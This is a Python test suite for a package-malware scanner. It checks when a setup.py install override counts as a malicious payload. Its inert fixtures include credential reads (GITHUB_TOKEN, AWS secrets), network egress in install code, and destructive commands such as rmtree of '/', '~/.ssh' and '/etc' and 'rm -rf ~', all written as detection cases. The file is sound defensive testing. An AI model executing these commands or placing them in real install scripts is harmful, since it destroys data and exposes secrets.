"""Census A (pypi-98): the decisions `InstallPayload.gate` makes for
`MALWARE.INSTALL.CONSUMER_CODE.001`.

A consumer-install override is the malicious install finding only when a payload is reachable from
the install code. These pin, with inert fixtures, that a compiler or a shipped *script* clears, a
shipped *native binary* or a real payload keeps, only CONSUMER_CODE is ever lowered, and a reachable
payload keeps it (the state that unparsable / unreachable install code fails closed into).
"""

from __future__ import annotations

import pathlib
import tempfile
from types import SimpleNamespace

from cordon_scanner import Scanner
from cordon_scanner.detect.code.capability.hits import CapabilityHit
from cordon_scanner.detect.code.install_payload import InstallPayload
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.content import FileContent

CONSUMER_CODE = "MALWARE.INSTALL.CONSUMER_CODE.001"

#: A setup.py that overrides the consumer-install command. `{imp}` is imported, `{body}` runs inside
#: the override. Nothing here executes on a scan -- the scanner reads it.
_SETUP = """from setuptools import setup
from setuptools.command.install import install
import {imp}


class Install(install):
    def run(self):
        {body}
        install.run(self)


setup(name="demo", version="1.0", cmdclass={{"install": Install}})
"""

#: ELF magic plus padding: `BinaryDetector.identify` reads it as a native executable. The bytes run
#: nothing; they are a header and zeros.
_ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56


class Fixture:
    """Builds an inert package tree and returns the rule ids a scan reports. Stateless."""

    @staticmethod
    def rules(root: str) -> list[str]:
        return [f.rule_id for f in Scanner().scan(root).findings]

    @staticmethod
    def unit(content: FileContent | None, path: str = "setup.py") -> SimpleNamespace:
        """A stand-in for the FileUnit `gate` reads: it uses only `.content` and `.path`."""
        return SimpleNamespace(content=content, path=path)

    @staticmethod
    def ctx(native: frozenset[str] = frozenset()) -> SimpleNamespace:
        """A stand-in for the ScanContext `gate` reads: it uses only `.shipped_native_paths`."""
        return SimpleNamespace(shipped_native_paths=native)

    @staticmethod
    def build(tmp: str, imp: str, body: str, extra: dict[str, bytes] | None = None) -> str:
        root = pathlib.Path(tmp)
        root.mkdir(parents=True, exist_ok=True)
        (root / "setup.py").write_text(_SETUP.format(imp=imp, body=body), encoding="utf-8")
        for rel, content in (extra or {}).items():
            path = root / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(content)
        return str(root)


class TestGateEndToEnd:
    """The whole chain: the engine computes `shipped_native_paths` and the install context, and the
    gate decides. Each case is one inert package."""

    def test_a_compiler_spawn_is_lowered(self) -> None:
        # (a) The install override spawns a system compiler by bare name: build work, not malware.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(t, "subprocess", 'subprocess.call(["cc", "-c", "x.c"])')
            assert CONSUMER_CODE not in Fixture.rules(root)

    def test_b_spawn_of_a_shipped_native_binary_is_kept(self) -> None:
        # (b) It spawns an ELF the package itself ships -- the author's own code, which no reader of
        # setup.py can see. Kept.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t, "subprocess", 'subprocess.call(["./dist/helper"])', {"dist/helper": _ELF}
            )
            assert CONSUMER_CODE in Fixture.rules(root)

    def test_c_spawn_of_a_shipped_script_is_lowered(self) -> None:
        # (c) It spawns a shipped shell script, which the scanner reads on its own. Lowered.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t,
                "subprocess",
                'subprocess.call(["./postinstall.sh"])',
                {"postinstall.sh": b"#!/bin/sh\necho building\n"},
            )
            assert CONSUMER_CODE not in Fixture.rules(root)

    def test_d_reachable_egress_is_kept(self) -> None:
        # (d) The install override reaches the network: a payload. Kept.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t, "urllib.request", 'urllib.request.urlopen("http://example.com/x").read()'
            )
            assert CONSUMER_CODE in Fixture.rules(root)

    def test_f_a_payload_beside_a_compiler_spawn_is_kept(self) -> None:
        # (f) A compiler spawn alone would lower, but a payload anywhere in the install code keeps it.
        # CONSUMER_CODE is file-scoped, so a payload the install reaches -- the state that unparsable
        # or unprovable reachability fails closed into, counting the code as reached -- keeps it.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t,
                "subprocess",
                'subprocess.call(["cc", "-c", "x.c"])\n'
                "        import urllib.request\n"
                '        urllib.request.urlopen("http://example.com/x").read()',
            )
            assert CONSUMER_CODE in Fixture.rules(root)


class TestGateUnit:
    """The gate's own decisions, independent of the engine."""

    def test_e_a_non_gated_malicious_finding_is_never_lowered(self) -> None:
        # (e) Only CONSUMER_CODE is gated. Another malicious finding -- even one whose only install
        # capability is a spawn -- is never lowered. The rule-id check short-circuits before the
        # unit and context are read, so they are untouched here.
        assert not InstallPayload.gate(
            "MALWARE.EXFIL.INSTALL_CALLBACK.001",
            True,
            {Capability.SPAWN},
            [],
            Fixture.unit(None),
            Fixture.ctx(),
        )

    def test_a_reachable_payload_capability_keeps_the_finding(self) -> None:
        # A payload capability short-circuits before the unit is read, so it is untouched.
        assert not InstallPayload.gate(
            CONSUMER_CODE, True, {Capability.EGRESS}, [], Fixture.unit(None), Fixture.ctx()
        )

    def test_a_spawn_only_window_with_nothing_shipped_is_lowered(self) -> None:
        unit = Fixture.unit(FileContent(path="setup.py", raw=b"", size=0))
        assert InstallPayload.gate(CONSUMER_CODE, True, {Capability.SPAWN}, [], unit, Fixture.ctx())

    def test_has_payload_truth_table(self) -> None:
        # Always a payload on its own.
        assert InstallPayload.has_payload({Capability.EGRESS})
        assert InstallPayload.has_payload({Capability.FETCH_EXEC})
        assert InstallPayload.has_payload({Capability.CREDENTIAL})
        # Never a payload on their own: build tools spawn compilers and write caches.
        assert not InstallPayload.has_payload({Capability.SPAWN})
        assert not InstallPayload.has_payload({Capability.PERSIST})
        assert not InstallPayload.has_payload({Capability.DELAY, Capability.FLOW})
        # A decode counts only together with a way to run what it produced.
        assert not InstallPayload.has_payload({Capability.DECODE})
        assert InstallPayload.has_payload({Capability.DECODE, Capability.EXECUTE})
        assert InstallPayload.has_payload({Capability.DECOMPRESS, Capability.DESERIALIZE})


class TestAVersionFileExecIsStillAPayload:
    """F1 cleared an `exec` of a version file the package ships (reviews/pypi-98/24) and was withdrawn: it
    was the only thing holding three half-A droppers, whose own payload is a spawn of an interpreter or a
    computed command the gate does not count. Each shape stays a payload."""

    @staticmethod
    def kept(path_expr: str, imp: str = "os") -> bool:
        body = f"with open({path_expr}) as f:\n            exec(f.read())"
        with tempfile.TemporaryDirectory() as t:
            return CONSUMER_CODE in Fixture.rules(Fixture.build(t, imp, body))

    def test_the_packages_own_version_file_keeps_the_finding(self) -> None:
        assert self.kept('"version.py"')
        assert self.kept('os.path.join(os.path.dirname(__file__), "pkg", "version.py")')

    def test_a_name_opened_twice_keeps_the_finding(self) -> None:
        body = (
            'with open("version.py") as f:\n'
            "            exec(f.read())\n"
            '        with open(os.path.join("pkg", "readme.txt")) as f:\n'
            "            pass"
        )
        with tempfile.TemporaryDirectory() as t:
            assert CONSUMER_CODE in Fixture.rules(Fixture.build(t, "os", body))


class TestAPlatformLookupOrANamedSetting:
    """R1 (reviews/pypi-98/24): a reconnaissance or credential hit that is only a platform lookup or the read of a
    setting named by a literal that is not another service's credential (`LegitimateUse.a_setting`, the test
    SUSPECT.EXFIL.DROP_POINT.001 already uses) is not a payload in install code: a build chooses its compiler by
    the platform. Who the machine is, the whole environment and a well-known credential still are."""

    @staticmethod
    def held(source: bytes, capability: Capability, *more: Capability) -> bool:
        """Whether the gate holds an install window whose one hit of `capability` is `source`, beside a
        compiler spawn and the `more` capabilities (none of which is read: only the capability set)."""
        recon = capability is Capability.RECONNAISSANCE
        rule = "CAP.PY.RECON.001" if recon else "CAP.PY.CREDENTIAL.001"
        hit = CapabilityHit(capability, rule, 0, len(source), 1)
        content = FileContent(path="setup.py", raw=source, size=len(source))
        local = {capability: hit, Capability.SPAWN: hit, **dict.fromkeys(more, hit)}
        return InstallPayload.gate(
            CONSUMER_CODE, True, local, [hit], Fixture.unit(content), Fixture.ctx()
        )

    def test_a_platform_lookup_is_build_work(self) -> None:
        assert self.held(b"platform.system()", Capability.RECONNAISSANCE)
        assert self.held(b"platform.machine()", Capability.RECONNAISSANCE)
        assert self.held(b"sys.platform", Capability.RECONNAISSANCE)

    def test_a_named_setting_is_not_loot(self) -> None:
        assert self.held(b'os.environ.get("CC", "cc")', Capability.CREDENTIAL)
        assert self.held(b'os.getenv("CXXFLAGS")', Capability.RECONNAISSANCE)

    # The twins: who the machine is, the whole environment, another service's credential.
    def test_the_hostname_or_the_user_keeps_the_finding(self) -> None:
        assert not self.held(b"socket.gethostname()", Capability.RECONNAISSANCE)
        assert not self.held(b"getpass.getuser()", Capability.RECONNAISSANCE)
        assert not self.held(b"os.getlogin()", Capability.RECONNAISSANCE)

    def test_the_whole_environment_keeps_the_finding(self) -> None:
        assert not self.held(b"dict(os.environ)", Capability.CREDENTIAL)
        assert not self.held(b"os.environ.copy()", Capability.CREDENTIAL)

    def test_a_well_known_credential_keeps_the_finding(self) -> None:
        assert not self.held(b'os.environ["GITHUB_TOKEN"]', Capability.CREDENTIAL)
        assert not self.held(b'os.environ.get("AWS_SECRET_ACCESS_KEY")', Capability.CREDENTIAL)
        assert not self.held(b'os.getenv("NPM_TOKEN")', Capability.CREDENTIAL)

    def test_a_setting_beside_a_real_payload_keeps_the_finding(self) -> None:
        assert not self.held(b"platform.system()", Capability.RECONNAISSANCE, Capability.EGRESS)
        assert not self.held(b"platform.system()", Capability.RECONNAISSANCE, Capability.DESTROY)

    def test_a_credential_beside_a_platform_lookup_keeps_it(self) -> None:
        platform = CapabilityHit(Capability.RECONNAISSANCE, "CAP.PY.RECON.001", 0, 17, 1)
        secret = CapabilityHit(Capability.CREDENTIAL, "CAP.PY.CREDENTIAL.001", 18, 48, 2)
        raw = b'platform.system()\nos.environ["GITHUB_TOKEN"]'
        content = FileContent(path="setup.py", raw=raw, size=len(raw))
        local = {Capability.RECONNAISSANCE: platform, Capability.CREDENTIAL: secret}
        assert not InstallPayload.gate(
            CONSUMER_CODE, True, local, [platform, secret], Fixture.unit(content), Fixture.ctx()
        )


class TestARemovalOfThePackagesOwnTree:
    """D1 (reviews/pypi-98/24): `DESTROY.WIPE.001` in install code is a payload unless every removal in the window
    targets the package's own tree: a path rooted in `__file__`, the working directory, a relative literal, a temp
    directory, or a command's output-dir attribute (`self.build_dir`, `build_lib`, `build_temp`, `dist_dir`,
    `bdist_dir`) that THIS FILE NEVER ASSIGNS (setuptools' finalize step or the user's command line decides it,
    not the package). A `..` component, an install destination (`self.root`, `self.prefix`), the home directory,
    an absolute path, argv, the environment, an unresolved name and a shell `rm` keep it a payload."""

    @staticmethod
    def kept(removal: str, before: str = "") -> bool:
        lines = [before] if before else []
        # the argv is a variable: a spawn written out in full is not read as a spawn here
        steps = [*lines, 'cmd = ["make", "-C", "src"]', "subprocess.call(cmd)", removal]
        body = "\n        ".join(steps)
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(t, "os, sys, shutil, subprocess, tempfile", body)
            return CONSUMER_CODE in Fixture.rules(root)

    def test_a_path_rooted_in_the_package_is_its_own(self) -> None:
        assert not self.kept('shutil.rmtree(os.path.join(os.path.dirname(__file__), "build"))')
        assert not self.kept('shutil.rmtree("build")')
        assert not self.kept('shutil.rmtree(os.path.join(os.getcwd(), "build", "tmp"))')

    def test_a_name_bound_to_such_a_path_is_its_own(self) -> None:
        before = 'target = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_build")'
        assert not self.kept("shutil.rmtree(target)", before)

    def test_a_temp_directory_is_the_packages_own(self) -> None:
        assert not self.kept("shutil.rmtree(tmp)", "tmp = tempfile.mkdtemp()")

    def test_a_command_output_dir_never_assigned_by_the_file_is_its_own(self) -> None:
        for attr in ("build_dir", "build_lib", "build_temp", "dist_dir", "bdist_dir"):
            assert not self.kept(f"shutil.rmtree(self.{attr})"), attr
        assert not self.kept('shutil.rmtree(os.path.join(self.build_lib, "pkg"))')

    # The twins: each removal can reach what the package does not own, and keeps the finding.
    def test_an_install_destination_keeps_the_finding(self) -> None:
        assert self.kept("shutil.rmtree(self.root)")
        assert self.kept("shutil.rmtree(self.prefix)")
        assert self.kept('shutil.rmtree(os.path.join(self.root, "x"))')

    def test_an_output_dir_the_file_assigns_is_traced_like_any_name(self) -> None:
        assert self.kept(
            "shutil.rmtree(self.build_dir)", 'self.build_dir = os.path.expanduser("~")'
        )
        assert not self.kept(
            "shutil.rmtree(self.build_dir)", 'self.build_dir = os.path.join("build", "x")'
        )
        assert self.kept("shutil.rmtree(self.dist_dir)", 'setattr(self, "dist_dir", "/")')
        assert self.kept(
            "shutil.rmtree(self.build_lib)",
            "self.set_undefined_options('build', ('build_lib', 'build_lib'))",
        )

    def test_a_parent_escape_keeps_the_finding(self) -> None:
        assert self.kept('shutil.rmtree(os.path.join(self.build_dir, "..", ".."))')
        assert self.kept('shutil.rmtree(os.path.join(os.path.dirname(__file__), ".."))')
        assert self.kept('shutil.rmtree("../build")')

    def test_the_home_an_absolute_path_argv_and_the_environment_keep_the_finding(self) -> None:
        assert self.kept('shutil.rmtree(os.path.expanduser("~/.ssh"))')
        assert self.kept('shutil.rmtree("/")')
        assert self.kept('shutil.rmtree("/etc")')
        assert self.kept("shutil.rmtree(sys.argv[1])")
        assert self.kept('shutil.rmtree(os.environ["TARGET"])')
        assert self.kept("shutil.rmtree(unknown_name)")

    def test_a_shell_removal_keeps_the_finding(self) -> None:
        assert self.kept('os.system("rm -rf ~")')
        assert self.kept('os.system("rm -rf build")')

    def test_one_foreign_removal_among_own_ones_keeps_the_finding(self) -> None:
        assert self.kept("shutil.rmtree(self.root)", 'shutil.rmtree("build")')
